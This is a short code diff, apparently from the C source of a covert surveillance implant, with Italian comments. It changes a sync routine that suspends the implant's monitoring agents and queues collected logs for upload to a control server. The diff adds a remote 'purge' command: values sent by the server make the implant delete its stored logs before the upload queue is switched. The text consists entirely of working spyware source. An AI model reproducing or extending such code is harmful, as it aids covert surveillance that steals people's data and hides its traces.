@@ -97,6 +97,8 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 	DWORD min_sleep;
 	DWORD max_sleep;
 	DWORD band_limit;
+	long long purge_time = 0;
+	DWORD purge_size = 0;
 
 	char *asp_server, *unique_id;
 	BOOL uninstall;
@@ -145,6 +147,8 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 			LOG_HandleDownload();
 		if (availables[i] == PROTO_FILESYSTEM)
 			LOG_HandleFileSystem();
+		if (availables[i] == PROTO_PURGE)
+			ASP_HandlePurge(&purge_time, &purge_size);
 
 		if (IsCrisisNetwork()) 
 			break; // Cosi' se aveva ricevuto la nuova configurazione, la attiva
@@ -158,6 +162,7 @@ BOOL WINAPI DA_Syncronize(BYTE *action_param)
 	// E ad agenti stoppati sposta tutti i log nella coda da inviare...
 	EnterCriticalSection(&action_critic_sec);
 	AM_SuspendRestart(AM_SUSPEND);
+	LOG_Purge(purge_time, purge_size); // se non sono stati valorizzati dal comando la funzione non fa nulla
 	Log_SwitchQueue();
 	if (new_conf)
 		AM_SuspendRestart(AM_RESET); // Riattiva gli agenti da file di configurazione (se c'e' nuovo)
